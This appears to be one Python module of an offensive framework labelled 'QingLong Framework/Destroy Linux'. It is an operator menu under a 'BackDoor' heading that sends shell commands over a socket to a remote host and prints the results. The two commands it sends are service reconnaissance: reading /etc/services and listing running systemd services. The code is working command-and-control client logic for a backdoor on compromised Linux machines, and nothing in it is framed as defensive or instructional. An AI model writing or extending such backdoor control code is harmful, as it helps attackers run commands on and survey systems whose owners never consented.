import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from AuxiliaryFunctions import MyTable
from prompt_toolkit.history import InMemoryHistory


def ServiceInformation(conn):
    commands = ["back", "show functions"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Destroy Linux)-\033[0m\033[1;31;31m[BackDoor/Information ~ Service Information] \033[0m')
    history = InMemoryHistory()
    while True:
        choice = prompt(formatted_text1, completer=completer, history=history)
        if choice.lower() == 'show functions':
            show_functions()
            continue
        elif choice == 'back':
            break
        elif choice == "":
            continue
        elif choice == '1':
            print('\033[1;32;32m' + "[+] 查询存在的服务:" + '\033[0m')
            command = "cat /etc/services"
            receive(conn, command)
        elif choice == '2':
            print('\033[1;32;32m' + "[+] 查询已经开启的服务:" + '\033[0m')
            command = "systemctl list-units --type=service --state=running"
            receive(conn, command)


def receive(conn, command):
    conn.sendall(command.encode("utf-8"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("utf-8", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("utf-8", errors="ignore")
            print(result)
            break


def show_functions():
    print("\n" + '\033[1;34;34m' + "Service Information" + '\033[0m' + "\n" + '=' * len("Service Information") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "Query existing services", "查询存在的服务"], ["2", "Query services that have already been opened", "查询已经开启的服务"]]
    MyTable.createTable(headers, mydata)
